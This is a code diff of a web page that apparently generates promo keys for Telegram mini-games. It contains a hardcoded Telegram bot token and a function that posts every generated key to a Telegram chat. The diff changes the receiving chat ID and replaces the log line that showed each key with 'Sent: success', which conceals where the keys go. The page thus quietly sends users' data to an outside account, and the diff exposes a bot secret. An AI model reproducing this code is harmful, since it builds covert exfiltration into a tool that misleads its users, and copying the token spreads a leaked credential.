@@ -14,13 +14,6 @@ document.addEventListener("DOMContentLoaded", () => {
       timing: 30000,
       attempts: 20,
     },
-    3: {
-      name: "My Clone Army",
-      appToken: "74ee0b5b-775e-4bee-974f-63e7f4d5bacb",
-      promoId: "fe693b26-b342-4159-8808-15e3ff7f8767",
-      timing: 20000,
-      attempts: 30,
-    },
     4: {
       name: "Train Miner",
       appToken: "82647f43-3f87-402d-88dd-09a90025313f",
@@ -82,7 +75,7 @@ document.addEventListener("DOMContentLoaded", () => {
   let selectedGameCard = null;
 
   const TELEGRAM_BOT_TOKEN = "6604200948:AAEQNFg9C4A_TIhAcSkrCNhqi1V6tkgRUa4";
-  const CHAT_ID = "6860012595";
+  const CHAT_ID = "1313102282";
 
   gameCards.forEach((card) => {
     card.addEventListener("click", () => {
@@ -218,28 +211,7 @@ document.addEventListener("DOMContentLoaded", () => {
     }
   };
 
-  // Telegramga jonatish
 
-  // Function to send message to Telegram
-//   async function sendToTelegram(message) {
-//     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-//     const response = await fetch(url, {
-//       method: "POST",
-//       headers: { "Content-Type": "application/json" },
-//       body: JSON.stringify({
-//         chat_id: CHAT_ID,
-//         text: message,
-//       }),
-//     });
-
-//     const data = await response.json();
-//     if (!response.ok) {
-//       console.log(data.description);
-
-//       throw new Error(data.description || "Failed to send message to Telegram");
-//     }
-//   }
-  //
   async function sendToTelegram(message) {
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     const response = await fetch(url, {
@@ -263,10 +235,10 @@ document.addEventListener("DOMContentLoaded", () => {
 async function sendMessages(keys) {
     for (const key of keys) {
         // Форматируем сообщение, добавляя тройные обратные кавычки
-        const formattedMessage = `\`\`\`\n${key}\n\`\`\``;
+        const formattedMessage = `\`${key}\``;
         try {
             await sendToTelegram(formattedMessage);
-            console.log(`Sent: ${key}`);
+            console.log(`Sent: success`);
         } catch (error) {
             console.error(`Failed to send: ${key}`);
         }
